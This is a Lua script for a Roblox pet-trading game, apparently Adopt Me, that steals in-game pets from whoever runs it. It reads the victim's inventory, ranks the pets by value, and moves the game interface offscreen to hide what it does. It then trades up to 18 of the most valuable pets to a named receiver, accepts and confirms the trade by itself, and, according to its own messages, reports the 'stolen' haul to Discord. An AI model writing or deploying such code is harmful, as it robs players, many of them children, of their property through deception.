local sent = false

local function TradeIncoming(ReceiverName)
    if sent then 
        print("âŒ Trade already in progress!")
        return 
    end
    sent = true
    
    print("ğŸ¯ Starting trade with: " .. ReceiverName)
    
    local RouterClient = Loaders("RouterClient")
    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
    local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
    local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)

    -- Get current pets before trade
    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
    local sortedPets = {}
    local stolenPets = {}
    
    for petUid, petData in pairs(PetsInventory) do
        local calculatedValue, baseValue, petName = calculatePetValue(petData)
        table.insert(sortedPets, {
            uid = petUid,
            data = petData,
            value = calculatedValue,
            baseValue = baseValue,
            name = petName,
            properties = petData.properties or {}
        })
    end
    
    -- Sort pets by value (highest first)
    table.sort(sortedPets, function(a, b)
        return a.value > b.value
    end)
    
    -- Send trade request
    moveGuiOffscreen()
    print("ğŸ“¨ Sending trade request...")
    SendTrade:FireServer(game.Players[ReceiverName])
    wait(5)
    
    -- Add pets to trade (best ones first)
    local petCount = 0
    local petLimit = 18
    
    print("ğŸ Adding pets to trade...")
    for _, petInfo in ipairs(sortedPets) do
        if petCount < petLimit then
            AddPetRemote:FireServer(petInfo.uid)
            table.insert(stolenPets, {
                name = petInfo.name,
                value = petInfo.value,
                properties = petInfo.properties
            })
            petCount = petCount + 1
            print("â• Added pet: " .. petInfo.name .. " (" .. math.floor(petInfo.value) .. "$)")
            wait(0.3)
        else
            break
        end
    end
    
    -- Calculate total stolen value
    local totalStolenValue = 0
    for _, pet in ipairs(stolenPets) do
        totalStolenValue = totalStolenValue + pet.value
    end
    
    print("ğŸ’° Total stolen value: " .. math.floor(totalStolenValue) .. "$")
    
    -- Accept negotiation and confirm trade
    print("âœ… Accepting negotiation...")
    wait(3)
    AcceptNegotiationRemote:FireServer()
    
    print("âœ… Confirming trade...")
    wait(3)
    ConfirmTradeRemote:FireServer()
    
    -- Send stolen pets information
    print("ğŸ“¤ Sending trade results to Discord...")
    wait(2)
    SendStolenPets(ReceiverName, stolenPets, totalStolenValue)
end

